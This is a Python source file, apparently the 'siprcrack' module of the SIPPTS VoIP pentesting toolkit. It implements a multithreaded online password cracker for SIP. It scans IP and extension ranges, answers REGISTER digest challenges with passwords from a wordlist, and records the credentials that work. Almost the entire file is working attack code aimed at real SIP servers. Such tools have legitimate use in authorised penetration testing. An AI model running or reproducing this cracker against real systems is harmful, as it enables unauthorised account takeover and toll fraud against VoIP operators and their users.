#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = "Jose Luis Verdeguer"
__version__ = "4.1"
__license__ = "GPL"
__copyright__ = "Copyright (C) 2015-2024, SIPPTS"
__email__ = "pepeluxx@gmail.com"

import socket
import sys
import ipaddress
import ssl
import re
import threading
import signal
import time

try:
    import cursor
except:
    pass

from .lib.functions import (
    create_message,
    parse_message,
    parse_digest,
    ip2long,
    long2ip,
    generate_random_string,
    get_free_port,
    calculateHash,
    format_time,
)
from .lib.color import Color
from .lib.logos import Logo
from itertools import product
from concurrent.futures import ThreadPoolExecutor


class SipRemoteCrack:
    def __init__(self):
        self.ip = ""
        self.host = ""
        self.proxy = ""
        self.route = ""
        self.rport = "5060"
        self.proto = "UDP"
        self.exten = ""
        self.prefix = ""
        self.authuser = ""
        self.ext_len = ""
        self.domain = ""
        self.contact_domain = ""
        self.wordlist = ""
        self.user_agent = "pplsip"
        self.threads = "100"
        self.verbose = "0"
        self.nocolor = ""
        self.timeout = 5

        self.run = True

        self.ips = []
        self.extens = []

        self.totaltime = 0
        self.found = []
        self.line = ["-", "\\", "|", "/"]
        self.pos = 0

        self.c = Color()

    def register(self, ip, to_user, pwd):
        if self.run == True:
            try:
                if self.proto == "UDP":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            except socket.error:
                print(f"{self.c.RED}Failed to create socket")
                print(self.c.WHITE)
                sys.exit(1)

            bind = "0.0.0.0"
            lport = get_free_port()

            try:
                sock.bind((bind, lport))
            except:
                lport = get_free_port()
                sock.bind((bind, lport))

            if self.proxy == "":
                host = (str(ip), int(self.rport))
            else:
                if self.proxy.find(":") > 0:
                    (proxy_ip, proxy_port) = self.proxy.split(":")
                else:
                    proxy_ip = self.proxy
                    proxy_port = "5060"

                host = (str(proxy_ip), int(proxy_port))

            if self.proxy != "":
                self.route = "<sip:%s;lr>" % self.proxy

            data = dict()

            msg = create_message(
                "REGISTER",
                "",
                self.contact_domain,
                to_user,
                "",
                self.domain,
                to_user,
                "",
                self.domain,
                self.proto,
                self.domain,
                self.user_agent,
                lport,
                "",
                "",
                "",
                "1",
                "",
                "",
                1,
                "",
                0,
                "",
                self.route,
                "",
                "",
                "",
                1,
            )

            if self.verbose == 1:
                print(
                    f"{self.c.BWHITE}[+] Sending to {ip}:{str(self.rport)}/{self.proto} ..."
                )
                print(f"{self.c.YELLOW}{msg}")

            try:
                sock.settimeout(self.timeout)

                if self.proto == "TCP":
                    sock.connect(host)

                if self.proto == "TLS":
                    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    context.load_default_certs()

                    sock_ssl = context.wrap_socket(sock, server_hostname=str(host[0]))
                    sock_ssl.connect(host)
                    sock_ssl.sendall(bytes(msg[:8192], "utf-8"))
                else:
                    sock.sendto(bytes(msg[:8192], "utf-8"), host)

                rescode = "100"

                while rescode[:1] == "1":
                    # receive temporary code
                    if self.proto == "TLS":
                        resp = sock_ssl.recv(4096)
                    else:
                        (resp, addr) = sock.recvfrom(4096)

                    headers = parse_message(resp.decode())

                    if headers and headers["response_code"] != "":
                        response = "%s %s" % (
                            headers["response_code"],
                            headers["response_text"],
                        )
                        rescode = headers["response_code"]

                        if self.verbose == 2:
                            print(
                                f"{self.c.BWHITE}[-] Receiving from {ip}:{self.rport}/{self.proto} ..."
                            )
                            print(f"{self.c.GREEN}{resp.decode()}{self.c.WHITE}")

                headers = parse_message(resp.decode())

                if headers and headers["response_code"] != "":
                    auth_header = ""
                    try:
                        auth_header = headers["auth"]
                    except:
                        pass

                    # Received the auth digest?
                    if auth_header != "":
                        method = "REGISTER"
                        auth = headers["auth"]
                        auth_type = headers["auth-type"]
                        callid = headers["callid"]
                        data["ua"] = headers["ua"]

                        headers = parse_digest(auth)

                        if self.authuser == "":
                            auth_user = to_user
                        else:
                            auth_user = self.authuser

                        realm = headers["realm"]
                        nonce = headers["nonce"]
                        uri = "sip:%s" % (self.domain)
                        algorithm = headers["algorithm"]
                        cnonce = headers["cnonce"]
                        nc = headers["nc"]
                        qop = headers["qop"]

                        if qop != "" and cnonce == "":
                            cnonce = generate_random_string(8, 8, "ascii")
                        if qop != "" and nc == "":
                            nc = "00000001"

                        response = calculateHash(
                            auth_user,
                            realm,
                            pwd,
                            method,
                            uri,
                            nonce,
                            algorithm,
                            cnonce,
                            nc,
                            qop,
                            0,
                            "",
                        )
                        digest = (
                            'Digest username="%s",realm="%s",nonce="%s",uri="%s",response="%s",algorithm=%s'
                            % (auth_user, realm, nonce, uri, response, algorithm)
                        )
                        if qop != "":
                            digest += ", qop=%s" % qop
                        if cnonce != "":
                            digest += ', cnonce="%s"' % cnonce
                        if nc != "":
                            digest += ", nc=%s" % nc

                        msg = create_message(
                            "REGISTER",
                            "",
                            self.contact_domain,
                            to_user,
                            "",
                            self.domain,
                            to_user,
                            "",
                            self.domain,
                            self.proto,
                            self.domain,
                            self.user_agent,
                            lport,
                            "",
                            callid,
                            "",
                            "1",
                            "",
                            digest,
                            auth_type,
                            "",
                            0,
                            "",
                            self.route,
                            "",
                            "",
                            "",
                            1,
                        )

                        if self.verbose == 1:
                            print(
                                f"{self.c.BWHITE}[+] Sending to {ip}:{str(self.rport)}/{self.proto} ..."
                            )
                            print(f"{self.c.YELLOW}{msg}")

                        if self.proto == "TLS":
                            sock_ssl.sendall(bytes(msg[:8192], "utf-8"))
                        else:
                            sock.sendto(bytes(msg[:8192], "utf-8"), host)

                        rescode = "100"

                        while rescode[:1] == "1":
                            # receive temporary code
                            if self.proto == "TLS":
                                resp = sock_ssl.recv(4096)
                            else:
                                resp = sock.recv(4096)

                            headers = parse_message(resp.decode())

                            if headers and headers["response_code"] != "":
                                response = "%s %s" % (
                                    headers["response_code"],
                                    headers["response_text"],
                                )
                                rescode = headers["response_code"]
                                if self.verbose == 1:
                                    print(
                                        f"{self.c.BWHITE}[+] Receiving from {ip}:{str(self.rport)} ..."
                                    )
                                    print(f"{self.c.GREEN}{resp.decode()}")

                                data["code"] = headers["response_code"]
                                data["text"] = headers["response_text"]

                return data
            except socket.timeout:
                print(f"{self.c.RED}\nSocket timeout error")
                if self.run == True:
                    exit()
                else:
                    pass
            except:
                print(f"{self.c.RED}Socket error{self.c.WHITE}")
                if self.run == True:
                    exit()
                else:
                    pass
            finally:
                sock.close()

        return data

    def signal_handler(self, sig, frame):
        print(f"{self.c.BYELLOW}You pressed Ctrl+C!")
        print(f"{self.c.BWHITE}\nStopping siprcrack ...")
        print(self.c.WHITE)

        self.stop()

    def stop(self):
        self.run = False

        for t in threading.enumerate():
            if t.name != "MainThread":
                try:
                    t.join()
                except:
                    pass

    def start(self):
        supported_protos = ["UDP", "TCP", "TLS"]

        self.proto = self.proto.upper()

        if self.nocolor == 1:
            self.c.ansy()

        # if rport is by default but we want to scan TLS protocol, use port 5061
        if self.rport == 5060 and self.proto == "TLS":
            self.rport = 5061

        # check protocol
        if self.proto not in supported_protos:
            print(f"{self.c.BRED}Protocol {self.proto} is not supported")
            print(self.c.WHITE)
            sys.exit()

        if self.host != "" and self.domain == "":
            self.domain = self.host
        if self.domain == "":
            self.domain = self.ip

        logo = Logo("siprcrack")
        logo.print()

        # create a list of IP addresses
        self.ips = []
        hosts = []
        for i in self.ip.split(","):
            try:
                i = socket.gethostbyname(i)
            except:
                pass
            hlist = list(ipaddress.ip_network(str(i)).hosts())

            if hlist == []:
                hosts.append(i)
            else:
                for h in hlist:
                    hosts.append(h)

        last = len(hosts) - 1
        start_ip = hosts[0]
        end_ip = hosts[last]

        ipini = int(ip2long(str(start_ip)))
        ipend = int(ip2long(str(end_ip)))

        for i in range(ipini, ipend + 1):
            self.ips.append(long2ip(i))

        # create a list of extens
        self.extens = []
        for p in self.exten.split(","):
            m = re.search(r"([0-9]+)-([0-9]+)", p)
            if m:
                for x in range(int(m.group(1)), int(m.group(2)) + 1):
                    if self.ext_len != "":
                        self.extens.append(str(x).zfill(int(self.ext_len)))
                    else:
                        self.extens.append(x)
            else:
                if self.ext_len != "":
                    self.extens.append(str(p).zfill(int(self.ext_len)))
                else:
                    self.extens.append(p)

        signal.signal(signal.SIGINT, self.signal_handler)
        print(f"{self.c.BYELLOW}\nPress Ctrl+C to stop\n")
        print(self.c.WHITE)

        threads = list()
        t = threading.Thread(target=self.crack, daemon=True)
        threads.append(t)
        t.start()

        t.join()

    def crack(self):
        max_values = 100000

        # threads to use
        nthreads = int(self.threads)
        total = len(list(product(self.ips, self.extens)))
        if nthreads > total:
            nthreads = total
        if nthreads < 1:
            nthreads = 1

        print(f"{self.c.BWHITE}[✓] IP/Network: {self.c.GREEN}{str(self.ip)}")
        if self.proxy != "":
            print(f"{self.c.BWHITE}[✓] Outbound Proxy: {self.c.GREEN}{self.proxy}")
        print(f"{self.c.BWHITE}[✓] Port: {self.c.GREEN}{self.rport}")
        if self.prefix != "":
            print(f"{self.c.BWHITE}[✓] Users prefix: {self.c.GREEN}{self.prefix}")
        print(f"{self.c.BWHITE}[✓] Exten range: {self.c.GREEN}{self.exten}")
        if self.authuser != "":
            print(f"{self.c.BWHITE}[✓] Auth User: {self.c.GREEN}{self.authuser}")
        print(f"{self.c.BWHITE}[✓] Protocol: {self.c.GREEN}{self.proto.upper()}")

        if (
            self.domain != ""
            and self.domain != str(self.ip)
            and self.domain != self.host
        ):
            print(f"{self.c.BWHITE}[✓] Customized Domain: {self.c.GREEN}{self.domain}")
        if self.contact_domain != "":
            print(
                f"{self.c.BWHITE}[✓] Customized Contact Domain: {self.c.GREEN}{self.contact_domain}"
            )
        if self.user_agent != "pplsip":
            print(
                f"{self.c.BWHITE}[✓] Customized User-Agent: {self.c.GREEN}{self.user_agent}"
            )

        print(f"{self.c.BWHITE}[✓] Total threads: {self.c.GREEN}{str(nthreads)}")
        print(f"{self.c.BWHITE}[✓] Wordlist: {self.c.GREEN}{self.wordlist}")
        print(self.c.WHITE)

        values = product(self.ips, self.extens)
        values2 = []
        count = 0

        iter = (a for a in enumerate(values))
        total = sum(1 for _ in iter)

        values = product(self.ips, self.extens)

        start = time.time()

        for i, val in enumerate(values):
            if self.run == True:
                if count < max_values:
                    values2.append(val)
                    count += 1

                try:
                    cursor.hide()
                except: 
                    pass
                if count == max_values or i + 1 == total:
                    try:
                        with ThreadPoolExecutor(max_workers=nthreads) as executor:
                            if self.run == True:
                                for i, val2 in enumerate(values2):
                                    val_ipaddr = val2[0]
                                    val_exten = val2[1]
                                    to_user = "%s%s" % (self.prefix, val_exten)

                                    executor.submit(self.scan_host, val_ipaddr, to_user)
                    except:
                        pass

                    values2.clear()
                    count = 0
                try:
                    cursor.show()
                except: 
                    pass

        end = time.time()
        self.totaltime = int(end - start)

        self.found.sort()
        self.print()

    def scan_host(self, ipaddr, to_user):
        data = dict()

        if self.run == True:
            with open(self.wordlist, "rb") as f:
                for pwd in f:
                    if self.run == True:
                        try:
                            pwd = pwd.decode("ascii")
                            pwd = pwd.replace("'", "")
                            pwd = pwd.replace('"', "")
                            pwd = pwd.replace("<", "")
                            pwd = pwd.replace(">", "")
                            pwd = pwd.replace("\n", "")
                            pwd = pwd.strip()
                            pwd = pwd[0:50]

                            if self.run == True:
                                try:
                                    self.pos += 1
                                    if self.pos > 3:
                                        self.pos = 0

                                    if self.contact_domain == "":
                                        self.contact_domain = "10.0.0.1"

                                    if self.authuser == "":
                                        auth_user = to_user
                                    else:
                                        auth_user = self.authuser

                                    data = self.register(ipaddr, to_user, pwd)

                                    str = f"{self.c.BYELLOW}[{self.line[self.pos]}] {self.c.BWHITE}Cracking {self.c.BYELLOW}{ipaddr}:{self.rport}/{self.proto}{self.c.BWHITE} => Exten/Pass: {self.c.BGREEN}{to_user}/{pwd}{self.c.BBLUE} - {data['code']} {data['text']}"
                                    print(str.ljust(200), end="\r")

                                    if data and data["code"] == "200":
                                        print(self.c.WHITE)
                                        print(
                                            f"Password for user {self.c.BBLUE}{auth_user}{self.c.WHITE} found: {self.c.BRED}{pwd}{self.c.WHITE}"
                                        )
                                        line = "%s###%s###%s###%s###%s" % (
                                            ipaddr,
                                            self.rport,
                                            self.proto,
                                            auth_user,
                                            pwd,
                                        )
                                        self.found.append(line)

                                        f.close()
                                        return
                                except:
                                    pass
                        except:
                            pwd = ""
                            pass

        print(self.c.WHITE)
        f.close()

    def print(self):
        iplen = len("IP address")
        polen = len("Port")
        prlen = len("Proto")
        uslen = len("User")
        pwlen = len("Password")

        for x in self.found:
            (ip, port, proto, user, pwd) = x.split("###")
            if len(ip) > iplen:
                iplen = len(ip)
            if len(port) > polen:
                polen = len(port)
            if len(proto) > prlen:
                prlen = len(proto)
            if len(user) > uslen:
                uslen = len(user)
            if len(pwd) > pwlen:
                pwlen = len(pwd)

        tlen = iplen + polen + prlen + uslen + pwlen + 14

        print(self.c.WHITE)
        print(
            f"{self.c.WHITE}+{'-' * (iplen + 2)}+{'-' * (polen + 2)}+{'-' * (prlen + 2)}+{'-' * (uslen + 2)}+{'-' * (pwlen + 2)}+"
        )

        print(
            f"{self.c.WHITE}| {self.c.BWHITE}{'IP address'.ljust(iplen)}{self.c.WHITE} | {self.c.BWHITE}{'Port'.ljust(polen)}{self.c.WHITE} | {self.c.BWHITE}{'Proto'.ljust(prlen)}{self.c.WHITE} | {self.c.BWHITE}{'User'.ljust(uslen)}{self.c.WHITE} | {self.c.BWHITE}{'Password'.ljust(pwlen)}{self.c.WHITE} |"
        )

        print(
            f"{self.c.WHITE}+{'-' * (iplen + 2)}+{'-' * (polen + 2)}+{'-' * (prlen + 2)}+{'-' * (uslen + 2)}+{'-' * (pwlen + 2)}+"
        )

        if len(self.found) == 0:
            print(f"{self.c.WHITE}| {self.c.WHITE}{'Nothing found'.ljust(tlen - 2)} |")
        else:
            for x in self.found:
                (ip, port, proto, user, pwd) = x.split("###")

                print(
                    f"{self.c.WHITE}| {self.c.BGREEN}{ip.ljust(iplen)}{self.c.WHITE} | {self.c.BMAGENTA}{port.ljust(polen)}{self.c.WHITE} | {self.c.BYELLOW}{proto.ljust(prlen)}{self.c.WHITE} | {self.c.BCYAN}{user.ljust(uslen)}{self.c.WHITE} | {self.c.BRED}{pwd.ljust(pwlen)}{self.c.WHITE} |"
                )

        print(
            f"{self.c.WHITE}+{'-' * (iplen + 2)}+{'-' * (polen + 2)}+{'-' * (prlen + 2)}+{'-' * (uslen + 2)}+{'-' * (pwlen + 2)}+"
        )
        print(self.c.WHITE)

        print(
            f"{self.c.BWHITE}Time elapsed: {self.c.YELLOW}{str(format_time(self.totaltime))}{self.c.WHITE}"
        )
        print(self.c.WHITE)
